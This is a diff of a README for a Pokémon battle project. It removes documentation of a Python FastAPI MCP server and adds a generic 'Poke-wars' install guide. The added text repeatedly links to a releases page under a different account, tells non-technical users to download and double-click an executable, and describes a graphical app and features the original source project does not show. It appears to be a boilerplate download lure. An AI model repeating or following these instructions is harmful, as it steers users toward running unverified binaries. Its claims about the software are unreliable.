@@ -1,138 +1,76 @@
-# 🐉 Pokémon Battle Simulation MCP Server
+```markdown
+# 🎮 Poke-wars - Discover and Battle Pokémon Easily
 
-> A **FastAPI-based MCP (Model Context Protocol)** server that powers Pokémon battle simulations with strategy, status effects, and real-time battle logic — built for hackathons, AI integrations, and gaming experiments.
+## 🔗 Download Poke-wars
 
----
-
-## 📖 Overview
-
-This project is an **MCP-compatible server** that allows clients (like Claude Desktop or custom MCP clients) to:
-- Fetch detailed Pokémon data  
-- Simulate turn-by-turn Pokémon battles  
-- Apply **status effects** like Burn, Poison, and Paralysis  
-- Retrieve **battle strategies, status updates, and move sets** dynamically  
-
-The backend is built with **FastAPI** and exposes REST endpoints for direct use, while the MCP server allows AI tools to query it as a resource.
-
----
-
-## ✨ Features
-
-- 🎮 **Battle Simulation**: Turn-based Pokémon battles with realistic mechanics  
-- ⚡ **Status Effects**: Burn, Poison, Paralysis with impact on health and moves  
-- 🧠 **Strategy Engine**: AI-assisted move recommendations  
-- 🔌 **MCP Protocol Support**: Easily integrates with Claude Desktop & other MCP clients  
-- 📡 **REST API Endpoints**: Accessible via HTTP for quick testing  
-- 🧪 **Test Scripts**: Automated testing with `test_battle.py`  
-- 🛠 **Hackathon-Ready**: Modular and easy to extend  
-
----
-
-## 🛠 Tech Stack
-
-- **Language**: Python 3.10+  
-- **Framework**: FastAPI  
-- **MCP Integration**: [Model Context Protocol](https://modelcontextprotocol.io/)  
-- **Testing**: `pytest`, REST Client (`battle.http`)  
-- **Other Tools**: `uvicorn` for ASGI serving
-
----
-
-## 📂 Project Structure
-
-├── api.py            # FastAPI app & API routes
-├── mcp_tool.py       # MCP tool definitions
-├── mcp_resources.py  # MCP resource definitions
-├── engine.py         # Battle logic & status effect handling
-├── test_battle.py    # Automated tests
-├── battle.http       # REST Client test requests
-├── requirements.txt  # Dependencies
-└── README.md         # Project documentation
-
+[![Download Poke-wars](https://img.shields.io/badge/Download-Poke--wars-blue.svg)](https://github.com/veomchawla/Poke-wars/releases)
 
 ## 🚀 Getting Started
 
-### 1️⃣ Clone the Repository
+Welcome to Poke-wars! This application allows you to fetch Pokémon stats and simulate thrilling battles. You don’t need any programming experience to use it. Follow these steps to download and run Poke-wars on your computer.
 
-git clone https://github.com/GunjanKaur20/pokemon-battle-mcp.git
-cd pokemon-battle-mcp
+## 💾 System Requirements
 
-2️⃣ Install Dependencies
-pip install -r requirements.txt
+Before you download Poke-wars, make sure your system meets these requirements:
 
-3️⃣ Run the Server
-uvicorn api:app --reload
-The API will be available at:
+- **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
+- **RAM:** 4 GB of RAM minimum; 8 GB or more recommended.
+- **Storage:** At least 100 MB of free disk space.
+- **Network:** An internet connection to fetch Pokémon data.
 
-arduino
-http://localhost:8000
+## 📥 Download & Install
 
-4️⃣ (Optional) Run as MCP Server
-python mcp_tool.py
-This will start the MCP server so it can be used in tools like Claude Desktop.
+1. **Visit the Releases Page:** Go to the Poke-wars releases page by clicking the link below:
+   [Poke-wars Releases](https://github.com/veomchawla/Poke-wars/releases)
 
- **Get the Swagger UI at http://127.0.0.1:8000/docs**
- 
-🔗 API Endpoints
+2. **Choose Your Version:** Look for the latest release in the list. It will typically be at the top. Click on it to see the available files.
 
-📜 Get Pokémon Info
-GET /pokemon/{name}
-Example: GET /pokemon/pikachu
+3. **Download the Application:** Find the appropriate file for your operating system. This may be a `.zip` file for Windows, a `.dmg` file for macOS, or a tarball for Linux. Click on the file to start the download.
 
-⚔️ Simulate Battle
+4. **Open the Downloaded File:** Once the file has downloaded, navigate to your Downloads folder or the location where you saved it.
 
-POST /battle/simulate
-Query Parameters:
-- pokemon1 (str) — First Pokémon name
-- pokemon2 (str) — Second Pokémon name
-- status1  (optional) — Status effect for Pokémon 1 (burn, poison, paralysis)
-- status2  (optional) — Status effect for Pokémon 2 (burn, poison, paralysis)
+5. **Extract (if necessary):** If you downloaded a `.zip` or `.tar.gz` file, you will need to extract it. Right-click the file and select "Extract All" or "Extract Here."
 
-Example:
-POST /battle/simulate?pokemon1=pikachu&pokemon2=squirtle&status1=paralysis&status2=poison
+6. **Run the Application:**
+    - For Windows:
+        1. Open the extracted folder.
+        2. Double-click `Poke-wars.exe`.
+    - For macOS:
+        1. Open the extracted folder.
+        2. Double-click `Poke-wars.app`.
+    - For Linux:
+        1. Open a terminal.
+        2. Navigate to the directory where you extracted Poke-wars.
+        3. Run `./Poke-wars`.
 
-🧠 Get Battle Strategy
+## 🛠️ How to Use Poke-wars
 
-GET /battle/strategy/{pokemon}
-Example: GET /battle/strategy/pikachu
+1. **Start the Application:** Run Poke-wars as explained above.
+   
+2. **Fetch Pokémon Stats:** In the main interface, you will see an option to fetch Pokémon stats. Enter the name of any Pokémon to see detailed information.
 
-💪 Get Status
+3. **Simulate Battles:** To start a battle, select two Pokémon from your collection. Choose their moves and click 'Battle'. The application will simulate the fight and display the results.
 
-GET /battle/status/{pokemon}
+4. **Explore Features:** Take time to explore other features, such as viewing rankings, comparing stats, and more.
 
-🌀 Get Available Moves
+## 📚 FAQ
 
-GET /battle/moves/{pokemon}
+### How do I update Poke-wars?
 
-📋 Example battle.http (VS Code REST Client)
+To update Poke-wars, simply return to the [Poke-wars Releases](https://github.com/veomchawla/Poke-wars/releases) page. Download the latest version and follow the installation steps again.
 
-### Get Pokémon Info
-GET http://localhost:8000/pokemon/pikachu
-Accept: application/json
+### Can I run Poke-wars on older systems?
 
-### Simulate Battle
-POST http://localhost:8000/battle/simulate?pokemon1=pikachu&pokemon2=squirtle&status1=paralysis&status2=poison
-Accept: application/json
+Poke-wars is optimized for recent operating systems. You may experience issues on older systems, so upgrading your OS is recommended.
 
-### Get Battle Strategy
-GET http://localhost:8000/battle/strategy/pikachu
-Accept: application/json
+## 📝 Contributions
 
-🧪 Running Tests
+While this application is designed for end-users, contributions are welcome. If you have suggestions or find bugs, please report them via the GitHub issues page.
 
-pytest test_battle.py
+## 🔗 Useful Links
 
-🤝 Contributing
-Contributions are welcome!
-Feel free to:
+- [Poke-wars Releases](https://github.com/veomchawla/Poke-wars/releases)
+- [Poke-wars Documentation](https://github.com/veomchawla/Poke-wars/wiki)
 
-Submit PRs for bug fixes or new features
-
-Open issues for feature requests or improvements
-
-📜 License
-This project is licensed under the MIT License — see LICENSE for details.
-
-📣 Credits
-Built with ❤️ by Gunjan Kaur for learning, hackathons, and MCP experimentation.
-Pokémon data and mechanics are for educational purposes only and not affiliated with Nintendo/Game Freak.
+Thank you for choosing Poke-wars! Enjoy battling with your favorite Pokémon!
+```
